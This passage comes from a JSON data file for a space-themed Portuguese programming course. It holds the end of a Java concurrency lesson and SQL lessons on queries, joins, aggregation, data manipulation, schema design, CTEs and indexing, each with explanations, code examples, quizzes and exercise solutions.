        "content": "# 🧵 Concorrência e Programação Multithread Básica\n\nMissão final em Enterprise World! Aplicações empresariais de grande escala precisam atender a milhares de solicitações por segundo processando operações em paralelo sem travar.\n\n> **💡 O que é uma Thread?**\n> Uma Thread (linha de execução) é a menor unidade de processamento que o sistema operacional pode agendar. Todo programa Java inicia com pelo menos a thread principal (`main`).\n\n---\n\n### ⚙️ Executando Tarefas com `Runnable` e `Thread`\n\n```java\npublic class AlertaMissao implements Runnable {\n    @Override\n    public void run() {\n        System.out.println(\"Processando telemetria em segundo plano na thread: \" + \n                           Thread.currentThread().getName());\n    }\n}\n\n// Disparando a thread:\nThread t1 = new Thread(new AlertaMissao());\nt1.start(); // Inicia a execução concorrente!\n```\n\n---\n\n### 🏭 O Padrão Corporativo Moderno: `ExecutorService`\n\nEm produção, nunca instanciamos `new Thread()` manualmente. Usamos um **Pool de Threads** gerenciado:\n\n```java\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\n// Pool fixo com 4 threads trabalhadoras\nExecutorService executor = Executors.newFixedThreadPool(4);\n\nexecutor.submit(() -> {\n    System.out.println(\"Processando imagem de satélite...\");\n});\n\n// Encerra o pool graciosamente ao terminar\nexecutor.shutdown();\n```\n\n---\n\n### 🚀 Assincronismo com `CompletableFuture`\n\nPara executar tarefas com retorno de valor assíncrono encadeado:\n\n```java\nimport java.util.concurrent.CompletableFuture;\n\nCompletableFuture.supplyAsync(() -> buscarDadosNoServidor())\n    .thenApply(dados -> processarEstatisticas(dados))\n    .thenAccept(relatorio -> System.out.println(\"Relatório pronto: \" + relatorio));\n```\n\n> **⚠️ Armadilha Comum:**\n> Acessar e modificar variáveis compartilhadas por múltiplas threads simultaneamente sem sincronização (*Race Condition*). Isso gera resultados inconsistentes imprevisíveis! Use tipos atômicos (`AtomicInteger`) ou blocos `synchronized`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Sempre chame `executor.shutdown()` para evitar que threads zumbis mantenham a JVM aberta impedindo a finalização do processo.\n- Evite bloquear threads esperando com `Thread.sleep()`; prefira abordagens assíncronas reativas.\n\n> **🛡️ Regra de Ouro:**\n> Isole o estado compartilhado entre threads o máximo possível; código sem estado (*stateless*) é imune a condições de corrida.",
        "codeExample": "import java.util.concurrent.CompletableFuture;\n\npublic class ServicoAsync {\n    public static CompletableFuture<String> autenticarAsync(String token) {\n        return CompletableFuture.supplyAsync(() -> {\n            // Operação assíncrona simulada\n            return \"Acesso liberado para: \" + token;\n        });\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que o uso de ExecutorService é amplamente preferido em relação a criar manualmente objetos new Thread() em aplicações Java?",
            "options": [
              "Porque o ExecutorService remove o garbage collector da máquina virtual.",
              "Porque criar threads do sistema operacional é custoso em memória e CPU, e o ExecutorService gerencia e reutiliza um pool fixo de threads recicladas.",
              "Porque new Thread() foi descontinuado e não compila mais.",
              "Para forçar o Java a rodar em navegadores web."
            ],
            "correctIndex": 1,
            "explanation": "O ExecutorService gerencia um pool controlado de threads que são recicladas para novas tarefas, evitando o custo proibitivo de criar e destruir threads a cada requisição."
          },
          {
            "type": "code",
            "instruction": "Escreva a linha de código Java que inicie a execução da thread \"minhaThread\" chamando o método correto de inicialização.",
            "initialCode": "Thread minhaThread = new Thread(() -> System.out.println(\"Rodando\"));\n// Inicie a thread aqui\n",
            "expectedKeywords": [
              "minhaThread.start();"
            ],
            "hint": "Chame o método .start() na instância da thread (não chame .run()!).",
            "solution": "minhaThread.start();"
          }
        ]
      }
    ]
  },
  {
    "id": "sql",
    "slug": "sql",
    "name": "SQL",
    "planetName": "Data Matrix",
    "description": "A linguagem soberana para consultar, filtrar e relacionar dados em bancos relacionais.",
    "icon": "🗄️",
    "color": "#E48E00",
    "language": "sql",
    "level": "Intermediário",
    "totalXp": 520,
    "lessons": [
      {
        "id": "sql-1",
        "title": "1. Consultas Mestras: SELECT, WHERE & ORDER BY",
        "description": "Extraia informações precisas de tabelas de bancos de dados relacionais.",
        "duration": 15,
        "xpReward": 60,
        "language": "sql",
        "content": "# 🗄️ Consultas Mestras em SQL\n\nBem-vindo à **Data Matrix**! Todas as missões, cadastros de cadetes, pontuações de XP e dados da frota estão armazenados em bancos de dados relacionais (PostgreSQL, MySQL, SQLite).\n\nO **SQL** (*Structured Query Language*) é a linguagem declarativa que permite extrair exatamente os dados necessários de tabelas estruturadas.\n\n---\n\n### 🔍 A Tríade da Consulta: `SELECT`, `FROM` & `WHERE`\n\nA estrutura elementar de qualquer consulta SQL:\n\n```sql\nSELECT nome, nivel, xp\nFROM cadetes\nWHERE xp >= 100;\n```\n\n- **`SELECT`**: Quais colunas você quer ver na resposta (use `*` para todas as colunas).\n- **`FROM`**: De qual tabela os dados devem ser puxados.\n- **`WHERE`**: Filtro condicional (apenas registros que atendam à condição).\n\n---\n\n### 📊 Ordenação e Limite: `ORDER BY` & `LIMIT`\n\nPara montar um ranking de líderes espaciais:\n\n```sql\nSELECT username, pontuacao_total\nFROM usuarios\nORDER BY pontuacao_total DESC\nLIMIT 10;\n```\n\n- **`ORDER BY coluna DESC`**: Ordena do maior para o menor (decrescente). Use `ASC` para crescente.\n- **`LIMIT N`**: Retorna apenas os N primeiros resultados (essencial para paginação e performance!).\n\n> **💡 Dica Pro:**\n> Em bancos de dados de produção com milhões de linhas, evite fazer `SELECT *`. Projete apenas as colunas que sua interface realmente usará para economizar largura de banda e memória de rede.\n\n> **⚠️ Armadilha Comum:**\n> Em SQL, valores de texto são cercados por aspas simples `'texto'`, e não aspas duplas! Aspas duplas em muitos dialetos SQL representam nomes de colunas ou tabelas.",
        "codeExample": "-- Ranking dos Cadetes Mais Condecorados da Galáxia\nSELECT id, username, nivel, xp\nFROM cadetes\nWHERE ativo = true AND nivel >= 5\nORDER BY xp DESC\nLIMIT 5;",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual cláusula do comando SQL é responsável por filtrar quais linhas da tabela devem ser devolvidas com base em uma condição lógica?",
            "options": [
              "ORDER BY",
              "WHERE",
              "GROUP BY",
              "LIMIT"
            ],
            "correctIndex": 1,
            "explanation": "A cláusula WHERE aplica filtros booleanos sobre as linhas da tabela, devolvendo apenas os registros que satisfazem a condição informada."
          },
          {
            "type": "fillblank",
            "title": "Filtrando os Agentes de Campo",
            "instruction": "Complete a consulta SQL para selecionar o nome dos agentes ativos.",
            "codeSnippet": "{{palavra_selecao}} nome\n{{palavra_origem}} agentes\n{{palavra_filtro}} status = 'ATIVO';",
            "blanks": [
              {
                "id": "palavra_selecao",
                "placeholder": "projeção de colunas",
                "expectedValues": [
                  "SELECT",
                  "select"
                ],
                "hint": "Comando SQL que inicia a busca e projeta as colunas desejadas."
              },
              {
                "id": "palavra_origem",
                "placeholder": "origem da tabela",
                "expectedValues": [
                  "FROM",
                  "from"
                ],
                "hint": "Palavra-chave que indica de qual tabela buscar os dados."
              },
              {
                "id": "palavra_filtro",
                "placeholder": "filtro condicional",
                "expectedValues": [
                  "WHERE",
                  "where"
                ],
                "hint": "Palavra-chave que aplica a condição de status ativo."
              }
            ],
            "explanation": "Perfeito! A sintaxe SELECT ... FROM ... WHERE ... é a fundação universal da manipulação de dados em SQL."
          },
          {
            "type": "code",
            "instruction": "Escreva uma consulta SQL que seleciona as colunas titulo e xp da tabela missoes onde nivel_dificuldade = \"Facil\" ordenado por xp DESC.",
            "initialCode": "-- Escreva sua consulta SQL abaixo\n",
            "expectedKeywords": [
              "SELECT titulo, xp",
              "FROM missoes",
              "WHERE nivel_dificuldade",
              "ORDER BY xp DESC"
            ],
            "hint": "Escreva: SELECT titulo, xp FROM missoes WHERE nivel_dificuldade = 'Facil' ORDER BY xp DESC;",
            "solution": "SELECT titulo, xp\nFROM missoes\nWHERE nivel_dificuldade = 'Facil'\nORDER BY xp DESC;"
          }
        ]
      },
      {
        "id": "sql-2",
        "title": "2. Conectando Mundos: Relacionamentos & JOINs",
        "description": "Una informações de múltiplas tabelas correlacionadas através de chaves estrangeiras.",
        "duration": 16,
        "xpReward": 65,
        "language": "sql",
        "content": "# 🔗 Conectando Mundos: Relacionamentos & JOINs\n\nEm um banco relacional, os dados raramente ficam em uma única tabela gigantesca. Em vez disso, eles são normalizados e separados em tabelas menores ligadas por **chaves estrangeiras** (*Foreign Keys*).\n\n---\n\n### 🔑 Chave Primária (PK) vs Chave Estrangeira (FK)\n\n- **Primary Key (PK):** O identificador exclusivo de cada linha (ex: `usuarios.id`).\n- **Foreign Key (FK):** Um campo em outra tabela que aponta para a PK de origem (ex: `pedidos.usuario_id`).\n\n---\n\n### 🤝 O Poder do `INNER JOIN`\n\nPara unir dados de tabelas diferentes em um único relatório, usamos `JOIN`:\n\n```sql\nSELECT usuarios.nome, cursos.titulo\nFROM usuarios\nINNER JOIN cursos ON cursos.id = usuarios.curso_atual_id;\n```\n\nO `INNER JOIN` devolve apenas as linhas que possuem correspondência exata em ambas as tabelas.\n\n---\n\n### 🌐 `LEFT JOIN`: Não Perca Ninguém!\n\nSe você quiser listar **todos os usuários**, mesmo aqueles que ainda não se matricularam em nenhum curso:\n\n```sql\nSELECT usuarios.nome, cursos.titulo\nFROM usuarios\nLEFT JOIN cursos ON cursos.id = usuarios.curso_atual_id;\n```\n\nSe o usuário não tiver curso, o campo `cursos.titulo` virá preenchido como `NULL`.\n\n> **💡 Dica Pro:**\n> Use aliases para encurtar suas consultas: `FROM usuarios u INNER JOIN inscricoes i ON i.usuario_id = u.id`. Isso torna o SQL mais legível e rápido de digitar.\n\n> **⚠️ Armadilha Comum:**\n> Esquecer a cláusula `ON` em um JOIN gera um \"Produto Cartesiano\" (`CROSS JOIN`), multiplicando todas as linhas de uma tabela por todas as da outra e travando o banco de dados!",
        "codeExample": "-- Relatório de Alunos e Lições Concluídas\nSELECT u.username, c.name AS nome_curso, p.completed\nFROM users u\nINNER JOIN user_progress p ON p.user_id = u.id\nINNER JOIN courses c ON c.id = p.course_id\nWHERE p.completed = true;",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual a diferença entre INNER JOIN e LEFT JOIN ao correlacionar duas tabelas A e B?",
            "options": [
              "INNER JOIN remove registros duplicados, enquanto LEFT JOIN os duplica.",
              "INNER JOIN só retorna registros que existem em ambas as tabelas; LEFT JOIN retorna todos os registros da tabela da esquerda (A), mesmo sem par na direita (B).",
              "LEFT JOIN só funciona com números e INNER JOIN com textos.",
              "São sinônimos idênticos em todos os bancos modernos."
            ],
            "correctIndex": 1,
            "explanation": "O LEFT JOIN preserva todos os registros da tabela base (à esquerda da cláusula), preenchendo as colunas da tabela da direita com NULL quando não houver correspondência."
          },
          {
            "type": "bughunt",
            "title": "Ambiguidade na Consulta Espacial",
            "scenario": "O relatório falhou com \"error: column reference id is ambiguous\" porque ambas as tabelas possuem uma coluna chamada id e a consulta não especificou de qual tabela puxar.",
            "buggyCode": "SELECT id, usuarios.nome, naves.modelo\nFROM usuarios\nINNER JOIN naves ON naves.id = usuarios.nave_id;",
            "expectedKeywords": [
              "SELECT usuarios.id, usuarios.nome, naves.modelo"
            ],
            "forbiddenKeywords": [
              "SELECT id, usuarios.nome, naves.modelo"
            ],
            "hint": "Especifique a qual tabela a coluna id pertence prefixando-a com usuarios.id.",
            "solutionExplanation": "Perfeito! Ao usar usuarios.id, o banco de dados elimina a ambiguidade e executa a união com total clareza."
          }
        ]
      },
      {
        "id": "sql-3",
        "title": "3. Agregações e Agrupamentos: GROUP BY & HAVING",
        "description": "Resuma grandes volumes de dados com COUNT, SUM, AVG, MAX, MIN e filtros agrupados com HAVING.",
        "duration": 15,
        "xpReward": 65,
        "language": "sql",
        "content": "# 📊 Agregações e Agrupamentos: GROUP BY & HAVING\n\nExtração de inteligência em Data Matrix! Na análise de dados de frotas e impérios estelares, não olhamos registros isolados; precisamos consolidar totais, médias e métricas agrupadas.\n\n> **💡 O que são Funções de Agregação?**\n> São operações matemáticas que recebem múltiplos valores de uma coluna e condensam tudo em um único número representativo:\n> - `COUNT(*)`: Conta a quantidade de linhas.\n> - `SUM(coluna)`: Soma todos os valores numéricos.\n> - `AVG(coluna)`: Calcula a média aritmética.\n> - `MAX(coluna)` / `MIN(coluna)`: Identifica os valores máximo e mínimo.\n\n---\n\n### 🗂️ Agrupando com `GROUP BY`\n\nAgrupe os registros por uma categoria (como planeta, cargo ou setor):\n\n```sql\nSELECT planeta, COUNT(*) AS total_habitantes, AVG(creditos) AS media_renda\nFROM cadetes\nGROUP BY planeta;\n```\n\n---\n\n### 🎯 A Diferença Vital: `WHERE` vs `HAVING`\n\nEssa é uma das pegadinhas mais clássicas do SQL:\n- **`WHERE`**: Filtra as linhas **ANTES** do agrupamento.\n- **`HAVING`**: Filtra os grupos consolidados **DEPOIS** do agrupamento.\n\n```sql\nSELECT setor, COUNT(*) AS qtd_naves\nFROM naves\nWHERE status = 'operacional'       -- Filtra apenas as naves que estão funcionando\nGROUP BY setor\nHAVING COUNT(*) >= 5;              -- Mantém apenas setores com 5 ou mais naves!\n```\n\n> **⚠️ Armadilha Comum:**\n> Tentar usar uma função agregada dentro do `WHERE` (ex: `WHERE AVG(salario) > 5000`). O SQL não permite isso porque o `WHERE` atua em cada linha antes da média sequer existir! Para filtrar agregados, use `HAVING`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Todas as colunas presentes no `SELECT` que não façam parte de uma função agregada **devem obrigatoriamente** constar na cláusula `GROUP BY`.\n- Use apelidos claros com `AS` para as colunas calculadas para facilitar o consumo pela API backend.\n\n> **🛡️ Regra de Ouro:**\n> `WHERE` filtra linhas individuais; `HAVING` filtra grupos sumarizados.",
        "codeExample": "SELECT \n    categoria, \n    COUNT(*) AS total_itens, \n    SUM(valor) AS valor_estoque\nFROM inventario\nWHERE ativo = true\nGROUP BY categoria\nHAVING SUM(valor) > 100000\nORDER BY valor_estoque DESC;",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual cláusula do SQL deve ser utilizada para filtrar grupos calculados após a execução da instrução GROUP BY?",
            "options": [
              "WHERE",
              "HAVING",
              "FILTER BY",
              "LIMIT"
            ],
            "correctIndex": 1,
            "explanation": "A cláusula HAVING atua especificamente sobre os resultados agregados produzidos pelo GROUP BY."
          },
          {
            "type": "code",
            "instruction": "Escreva uma consulta SQL que selecione \"setor\" e \"COUNT(*) AS total\" da tabela \"tripulantes\", agrupando por \"setor\".",
            "initialCode": "-- Escreva a consulta SQL aqui\n",
            "expectedKeywords": [
              "SELECT setor, COUNT(*) AS total",
              "FROM tripulantes",
              "GROUP BY setor"
            ],
            "hint": "Use: SELECT setor, COUNT(*) AS total FROM tripulantes GROUP BY setor;",
            "solution": "SELECT setor, COUNT(*) AS total FROM tripulantes GROUP BY setor;"
          }
        ]
      },
      {
        "id": "sql-4",
        "title": "4. Manipulação de Dados: INSERT, UPDATE & DELETE",
        "description": "Altere o estado das tabelas com inserções de linhas, atualizações seguras e exclusões condicionais.",
        "duration": 15,
        "xpReward": 65,
        "language": "sql",
        "content": "# ✍️ Manipulação de Dados: INSERT, UPDATE & DELETE\n\nOperações de escrita na Data Matrix! Além de ler informações com `SELECT`, administradores de banco dominam os comandos DML (*Data Manipulation Language*) para criar, atualizar e expurgar dados.\n\n> **💡 O Ciclo DML**\n> - **`INSERT`**: Adiciona novos registros às tabelas.\n> - **`UPDATE`**: Modifica valores existentes em linhas específicas.\n> - **`DELETE`**: Remove linhas que atendam a um critério.\n\n---\n\n### 📥 Inserindo Registros com `INSERT INTO`\n\n```sql\nINSERT INTO cadetes (nome, planeta, patente, xp)\nVALUES ('Zack Hunter', 'Terra Digital', 'Iniciado', 250);\n\n-- Inserindo múltiplos registros em um único comando:\nINSERT INTO naves (modelo, status)\nVALUES \n  ('Nexus-A', 'ativo'),\n  ('Nexus-B', 'manutencao');\n```\n\n---\n\n### ⚠️ O Perigo Mortal do `UPDATE` e `DELETE` sem `WHERE`!\n\nEsta é a regra mais sagrada de qualquer administrador de banco de dados do universo:\n\n```sql\n-- CORRETO: Atualiza APENAS o cadete com ID 42\nUPDATE cadetes\nSET patente = 'Veterano', xp = xp + 500\nWHERE id = 42;\n\n-- CORRETO: Deleta APENAS a nave inativa identificada\nDELETE FROM naves\nWHERE id = 99 AND status = 'destruida';\n```\n\n> **⚠️ Armadilha Comum:**\n> Executar `UPDATE` ou `DELETE` sem a cláusula `WHERE`! Se você rodar `DELETE FROM cadetes;`, o banco apagará TODOS os cadetes da galáxia sem perguntar duas vezes!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Em comandos críticos em produção, sempre execute primeiro um `SELECT * FROM tabela WHERE condicao` para ter 100% de certeza de quais linhas serão impactadas.\n- Envolva operações de alteração em massa em transações com `BEGIN TRANSACTION` para poder executar `ROLLBACK` em caso de engano.\n\n> **🛡️ Regra de Ouro:**\n> \"No WHERE, no UPDATE. No WHERE, no DELETE.\" — O mandamento inegociável do DBA.",
        "codeExample": "-- Atualização protegida com transação\nBEGIN;\nUPDATE contas_bancarias\nSET saldo = saldo - 50\nWHERE usuario_id = 101;\nCOMMIT;",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que acontece ao executar o comando \"DELETE FROM usuarios;\" em um banco de dados relacional padrão?",
            "options": [
              "A tabela é excluída do esquema do banco de dados junto com suas colunas.",
              "O comando gera um erro de sintaxe exigindo a coluna a ser deletada.",
              "Todas as linhas da tabela usuarios são excluídas de forma irreversível.",
              "Apenas o primeiro registro cadastrado é removido."
            ],
            "correctIndex": 2,
            "explanation": "Sem a cláusula WHERE, o comando DELETE remove todas as linhas contidas na tabela."
          },
          {
            "type": "code",
            "instruction": "Escreva um comando UPDATE que altere o status para 'inativo' na tabela \"sistemas\" para todas as linhas onde \"energia = 0\".",
            "initialCode": "-- Escreva o comando UPDATE aqui\n",
            "expectedKeywords": [
              "UPDATE sistemas",
              "SET status = 'inativo'",
              "WHERE energia = 0"
            ],
            "hint": "Use: UPDATE sistemas SET status = 'inativo' WHERE energia = 0;",
            "solution": "UPDATE sistemas SET status = 'inativo' WHERE energia = 0;"
          }
        ]
      },
      {
        "id": "sql-5",
        "title": "5. Modelagem DDL: CREATE TABLE, Primary & Foreign Keys",
        "description": "Projete esquemas relacionais íntegros com chaves primárias, estrangeiras e restrições de integridade.",
        "duration": 16,
        "xpReward": 65,
        "language": "sql",
        "content": "# 🏗️ Modelagem DDL: CREATE TABLE, Primary & Foreign Keys\n\nConstruindo as fundações estruturais da Data Matrix! Para que um banco de dados relacional seja confiável, precisamos definir tabelas, tipos de dados e restrições (*Constraints*) com **DDL** (*Data Definition Language*).\n\n> **💡 Chaves Primárias e Estrangeiras**\n> - **Primary Key (PK)**: Identificador único e exclusivo de uma linha (nunca nulo e nunca duplicado).\n> - **Foreign Key (FK)**: Elo de conexão que aponta para a Primary Key de outra tabela, garantindo integridade referencial.\n\n---\n\n### 🏛️ Criando Tabelas com Integridade Relacional\n\n```sql\n-- 1. Tabela Pai: Planetas\nCREATE TABLE planetas (\n    id SERIAL PRIMARY KEY,\n    nome VARCHAR(100) NOT NULL UNIQUE,\n    gravidade DECIMAL(3, 2) NOT NULL,\n    criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- 2. Tabela Filha: Cadetes (vinculada aos planetas)\nCREATE TABLE cadetes (\n    id SERIAL PRIMARY KEY,\n    nome VARCHAR(120) NOT NULL,\n    email VARCHAR(255) NOT NULL UNIQUE,\n    planeta_id INT NOT NULL,\n    status VARCHAR(20) DEFAULT 'ativo',\n    \n    -- Restrição de Chave Estrangeira:\n    CONSTRAINT fk_planeta_origem\n        FOREIGN KEY (planeta_id) \n        REFERENCES planetas(id)\n        ON DELETE RESTRICT\n);\n```\n\n---\n\n### 🛡️ Restrições Comuns (*Constraints*)\n\n- **`NOT NULL`**: Impede que a coluna fique sem valor preenchido.\n- **`UNIQUE`**: Garante que nenhum outro registro tenha o mesmo valor (essencial para e-mails e CPFs).\n- **`CHECK`**: Valida uma regra lógica (ex: `CHECK (idade >= 18)`).\n- **`ON DELETE CASCADE`**: Se o registro pai for deletado, apaga os filhos automaticamente.\n- **`ON DELETE RESTRICT`**: Impede que o registro pai seja apagado enquanto houver registros filhos vinculados a ele!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de criar índices em colunas que são chaves estrangeiras. Sem índice na FK, consultas com `JOIN` entre tabelas gigantescas tornam-se extremamente lentas!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Escolha tipos de dados apropriados: não use `VARCHAR(255)` para um campo booleano ou numérico.\n- Utilize identificadores numéricos automáticos (`SERIAL` / `BIGSERIAL`) ou `UUID` para chaves primárias.\n\n> **🛡️ Regra de Ouro:**\n> O banco de dados deve ser o guardião final da integridade dos dados, nunca confiando apenas nas validações do frontend.",
        "codeExample": "CREATE TABLE missoes (\n    id SERIAL PRIMARY KEY,\n    titulo VARCHAR(150) NOT NULL,\n    recompensa_xp INT CHECK (recompensa_xp >= 0),\n    data_inicio DATE NOT NULL\n);",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual restrição (Constraint) do SQL impede a inserção de dois registros com o mesmo endereço de e-mail na tabela?",
            "options": [
              "NOT NULL",
              "PRIMARY KEY ou UNIQUE",
              "FOREIGN KEY",
              "CHECK"
            ],
            "correctIndex": 1,
            "explanation": "A restrição UNIQUE (assim como a PRIMARY KEY) impede duplicidade, garantindo a unicidade do valor na coluna em toda a tabela."
          },
          {
            "type": "code",
            "instruction": "Escreva a instrução SQL para criar uma tabela chamada \"logs\" com uma coluna \"id SERIAL PRIMARY KEY\" e uma coluna \"mensagem TEXT NOT NULL\".",
            "initialCode": "-- Escreva o comando CREATE TABLE aqui\n",
            "expectedKeywords": [
              "CREATE TABLE logs (",
              "id SERIAL PRIMARY KEY",
              "mensagem TEXT NOT NULL",
              ");"
            ],
            "hint": "Use: CREATE TABLE logs (\n  id SERIAL PRIMARY KEY,\n  mensagem TEXT NOT NULL\n);",
            "solution": "CREATE TABLE logs (\n  id SERIAL PRIMARY KEY,\n  mensagem TEXT NOT NULL\n);"
          }
        ]
      },
      {
        "id": "sql-6",
        "title": "6. Subconsultas (Subqueries) & CTEs com WITH",
        "description": "Escreva consultas complexas e legíveis usando subconsultas correlacionadas e Common Table Expressions (WITH).",
        "duration": 17,
        "xpReward": 65,
        "language": "sql",
        "content": "# 🧬 Subconsultas (Subqueries) & CTEs com WITH\n\nNavegação em múltiplas camadas na Data Matrix! Quando uma consulta simples não é suficiente para responder perguntas complexas de negócios, encadeamos resultados com **Subconsultas** e **CTEs**.\n\n> **💡 O que é uma CTE (Common Table Expression)?**\n> Uma CTE é uma tabela temporária nomeada definida no início da consulta usando a cláusula `WITH`. Ela torna instruções gigantescas legíveis, organizadas e muito mais fáceis de depurar do que subconsultas aninhadas em cascata.\n\n---\n\n### 📦 A Cláusula `WITH` (CTE) na Prática\n\n```sql\n-- 1. Definindo a tabela temporária \"media_por_planeta\"\nWITH media_por_planeta AS (\n    SELECT planeta_id, AVG(xp) AS media_xp\n    FROM cadetes\n    GROUP BY planeta_id\n)\n-- 2. Consumindo a CTE na consulta principal:\nSELECT c.nome, c.xp, m.media_xp\nFROM cadetes c\nJOIN media_por_planeta m ON c.planeta_id = m.planeta_id\nWHERE c.xp > m.media_xp; -- Cadetes com XP acima da média do seu planeta!\n```\n\n---\n\n### 🔍 Subconsultas com `IN` e `EXISTS`\n\nSubconsultas dentro do `WHERE` resolvem filtros relacionais rápidos:\n\n```sql\n-- Seleciona naves que possuem pelo menos uma missão de status 'critico'\nSELECT nome, modelo\nFROM naves\nWHERE id IN (\n    SELECT DISTINCT nave_id\n    FROM missoes\n    WHERE severidade = 'critico'\n);\n```\n\n- **`EXISTS`**: Verifica a existência sem precisar carregar toda a lista de IDs na memória, sendo frequentemente mais performático para tabelas massivas.\n\n> **⚠️ Armadilha Comum:**\n> Aninhar 4 ou 5 subconsultas entre parênteses dentro de outras subconsultas. O código fica ilegível e o otimizador do banco pode gerar planos de execução ineficientes. Sempre que possível, refatore para CTEs com `WITH`!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Dê nomes autoexplicativos às suas CTEs que descrevam o dado transformado (ex: `cadetes_ativos_com_alta_performance`).\n- Use CTEs recursivas (`WITH RECURSIVE`) para navegar em árvores hierárquicas (como organogramas de patentes da frota).\n\n> **🛡️ Regra de Ouro:**\n> Se uma subconsulta precisa ser reutilizada mais de uma vez no mesmo comando SQL, declare-a como uma CTE.",
        "codeExample": "WITH naves_rapidas AS (\n    SELECT id, modelo, velocidade_max\n    FROM naves\n    WHERE velocidade_max > 1000\n)\nSELECT COUNT(*) AS total_velozes FROM naves_rapidas;",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual palavra-chave do SQL é utilizada para iniciar a declaração de uma CTE (Common Table Expression)?",
            "options": [
              "AS",
              "WITH",
              "DECLARE",
              "TEMP"
            ],
            "correctIndex": 1,
            "explanation": "A cláusula WITH inicia a declaração de uma ou mais CTEs (tabelas de expressão temporárias nomeadas)."
          },
          {
            "type": "code",
            "instruction": "Escreva uma CTE chamada \"ativos\" usando WITH que selecione \"* FROM usuarios WHERE status = 'ativo'\", seguida por um \"SELECT * FROM ativos;\".",
            "initialCode": "-- Escreva a CTE aqui\n",
            "expectedKeywords": [
              "WITH ativos AS (",
              "SELECT * FROM usuarios WHERE status = 'ativo'",
              ")",
              "SELECT * FROM ativos;"
            ],
            "hint": "Use: WITH ativos AS (\n  SELECT * FROM usuarios WHERE status = 'ativo'\n)\nSELECT * FROM ativos;",
            "solution": "WITH ativos AS (\n  SELECT * FROM usuarios WHERE status = 'ativo'\n)\nSELECT * FROM ativos;"
          }
        ]
      },
      {
        "id": "sql-7",
        "title": "7. Índices e Otimização de Performance",
        "description": "Elimine lentidão criando índices com CREATE INDEX e analise planos de execução com EXPLAIN ANALYZE.",
        "duration": 16,
        "xpReward": 65,
        "language": "sql",
        "content": "# ⚡ Índices e Otimização de Performance\n\nAceleradores hiperespaciais na Data Matrix! Quando uma tabela tem 1.000 linhas, qualquer consulta parece instantânea. Quando ela atinge 10 milhões de registros, uma consulta malfeita pode demorar minutos e derrubar a infraestrutura.\n\n> **💡 O que é um Índice (B-Tree)?**\n> Um índice no banco funciona como o sumário remissivo no final de um livro de 1.000 páginas. Em vez de folhear página por página (*Full Table Scan* ou *Seq Scan*), o banco salta diretamente para a página certa em milissegundos usando árvores balanceadas (B-Tree).\n\n---\n\n### 🔍 Criando Índices com `CREATE INDEX`\n\n```sql\n-- Cria um índice na coluna email para buscas instantâneas\nCREATE INDEX idx_cadetes_email ON cadetes(email);\n\n-- Índice composto (útil quando você busca por planeta E status juntos)\nCREATE INDEX idx_cadetes_planeta_status ON cadetes(planeta_id, status);\n```\n\n---\n\n### 🔬 O Raio-X do Banco: `EXPLAIN ANALYZE`\n\nPara entender o que o banco está fazendo por trás dos panos:\n\n```sql\nEXPLAIN ANALYZE\nSELECT * FROM cadetes WHERE email = 'alex@nexus.io';\n```\n\n- **Seq Scan (Scan Sequencial):** O banco leu a tabela inteira do primeiro ao último byte (ruim em tabelas gigantes!).\n- **Index Scan / Bitmap Index Scan:** O banco utilizou o índice e foi direto ao alvo em microssegundos (excelente!).\n\n> **⚠️ Armadilha Comum:**\n> Criar índices em todas as colunas da tabela por precaução! Índices aceleram a **leitura** (`SELECT`), mas deixam as operações de **escrita** (`INSERT`, `UPDATE`, `DELETE`) mais lentas, pois a cada novo registro o banco precisa recalcular e reescrever a árvore do índice no disco.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Coloque índices em colunas frequentemente usadas no `WHERE`, no `JOIN` e no `ORDER BY`.\n- Evite aplicar funções na coluna dentro do `WHERE` (ex: `WHERE UPPER(email) = '...'`), pois isso anula o uso do índice comum a menos que você crie um índice funcional!\n\n> **🛡️ Regra de Ouro:**\n> Otimize com base em métricas reais usando `EXPLAIN ANALYZE`, e não em achismos.",
        "codeExample": "-- Criação de índice único que garante integridade e velocidade\nCREATE UNIQUE INDEX idx_naves_codigo_chassi ON naves(codigo_chassi);",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o impacto negativo direto de criar índices excessivos em colunas que quase nunca são consultadas?",
            "options": [
              "O banco de dados recusa conexões via porta 5432.",
              "As operações de escrita (INSERT, UPDATE e DELETE) tornam-se mais lentas e o consumo de disco aumenta significativamente.",
              "O banco passa a aceitar apenas caracteres maiúsculos.",
              "O SQL desativa automaticamente as chaves primárias."
            ],
            "correctIndex": 1,
            "explanation": "Cada índice precisa ser mantido atualizado a cada operação de escrita, adicionando overhead de CPU e consumo de armazenamento em disco."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando SQL para criar um índice chamado \"idx_telemetria_data\" na coluna \"criado_em\" da tabela \"telemetria\".",
            "initialCode": "-- Escreva o comando CREATE INDEX aqui\n",
            "expectedKeywords": [
              "CREATE INDEX idx_telemetria_data",
              "ON telemetria(criado_em);"
            ],
            "hint": "Use: CREATE INDEX idx_telemetria_data ON telemetria(criado_em);",
            "solution": "CREATE INDEX idx_telemetria_data ON telemetria(criado_em);"
          }
        ]
      },
      {
        "id": "sql-8",
        "title": "8. Transações ACID e Controle de Integridade",
        "description": "Garanta consistência inabalável com Atomicidade, Consistência, Isolamento, Durabilidade e bloqueios de concorrência.",
        "duration": 17,
        "xpReward": 70,
        "language": "sql",
